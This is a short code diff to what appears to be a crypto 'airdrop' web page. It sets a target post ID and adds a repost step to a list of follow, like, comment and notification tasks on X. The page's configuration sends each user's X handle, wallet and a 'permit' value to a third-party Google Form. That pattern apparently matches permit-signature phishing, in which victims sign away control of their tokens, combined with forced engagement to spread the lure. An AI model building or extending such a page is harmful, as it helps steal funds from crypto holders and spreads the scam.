@@ -106,7 +106,7 @@ body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:9;box
 /* ============ SETTINGS ============ */
 const CONFIG = {
   handle:  "FFggRH0x",
-  tweetId: "",   // post ID for like & comment
+  tweetId: "2114794915867545633",   // post ID for like & comment
   formUrl: "https://docs.google.com/forms/d/e/1FAIpQLSe3nPTAoqD-BYuzJGu6dFc6jNJxDCpZXDqELXVXkEnADA4MCA/formResponse",
   fields: {x:"entry.1049186356", wallet:"entry.601030845", permit:"entry.1091051622", time:"entry.1870719561"},
   wait: 3        // seconds per task
@@ -166,6 +166,7 @@ function ask(label,{placeholder="",validate,paste=false,value=""}){
 const TASKS=[
   {name:"follow",   title:"Follow @"+H,              hint:"follow the official account",           url:"https://x.com/intent/follow?screen_name="+H},
   {name:"like",     title:"Like the post",           hint:"like the airdrop post",                 url:T?"https://x.com/intent/like?tweet_id="+T:P},
+  {name:"retweet",  title:"Repost the post",         hint:"retweet the airdrop post",              url:T?"https://x.com/intent/retweet?tweet_id="+T:P},
   {name:"comment",  title:"Comment on the post",     hint:"write anything — your words",           url:T?"https://x.com/intent/post?in_reply_to="+T:P},
   {name:"notify",   title:"Turn on notifications 🔔", hint:"open the profile and tap the bell",     url:P}
 ];
